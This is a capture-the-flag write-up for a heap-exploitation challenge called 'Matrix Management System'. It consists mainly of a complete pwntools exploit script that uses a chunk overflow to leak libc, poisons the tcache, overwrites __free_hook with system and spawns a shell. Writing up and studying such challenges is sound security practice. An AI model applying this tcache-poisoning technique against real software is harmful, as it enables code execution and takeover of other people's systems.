### Matrix Management System (400 Points)

> Neo, we've done it. We've figured out how they make new matrixes and transfer people around. End it all from the source.
>
> [attachment](heapsoftrouble-25dc62650f966e6f47b50a0704f2c976)

Maybe reverse part is annoying, but the vulnerability is obvious, that's the overflow function of option 7.

We can use the chunk overflow change the anything which stored in next chunk, such as the size of Matrix, the fd pointer of tcachebin. 



#### exploit script

```python
#!/usr/bin/env python
from pwn import * 
# context.log_level='debug'

p = process('./heapsoftrouble-25dc62650f966e6f47b50a0704f2c976')
elf = ELF('./heapsoftrouble-25dc62650f966e6f47b50a0704f2c976')
libc = elf.libc

def free(idx):
	p.recvuntil('Exit\n')
	p.sendline('2')
	p.recvuntil('Matrix: ')
	p.sendline('Matrix #{}'.format(str(idx)))

def free2(idx):
	p.recvuntil('Exit\n')
	p.sendline('2')
	p.recvuntil('Matrix: ')
	p.sendline('{}'.format(str(idx)))

def add(matrix,popu):
	p.recvuntil('Exit\n')
	p.sendline('1')
	p.recvuntil('New Matrix: ')
	p.sendline(matrix)
	p.recvuntil('new matrix: ')
	p.sendline(str(popu))

def overflow(data):
    p.sendline(b'7')
    p.sendline(data)

def show(name):
    p.sendline(b'4')
    p.recvuntil('Matrix: ')
    p.sendline(name)

# gdb.attach(p)
# login
p.recvuntil('ogin: ')
p.sendline('AAAA')

free(1)

for i in range(6):
	add('A'*0x80,1)
	free2('A'*0x80)
add('b'*0x80,1)
free2('b'*0x80)


free(4)
overflow('BBBB')
overflow(p64(0x0)*5+p64(0x31)+p64(0x2333)+p64(0x23333)+p32(0x800))

show('Matrix #5')
leak = p.recvuntil('b',drop=True)
libc.address = u64(leak[-8:])-0x1ebbe0


add('/bin/sh\x00',1)
add('B'*0x20,1)
free(7)

overflow(p64(0)*5+p64(0x31)+p64(libc.sym['__free_hook']-2))
overflow('AAAA')
overflow('A\x00'+p64(libc.sym['system']))


# gdb.attach(p)
free2('/bin/sh')

p.interactive()
```

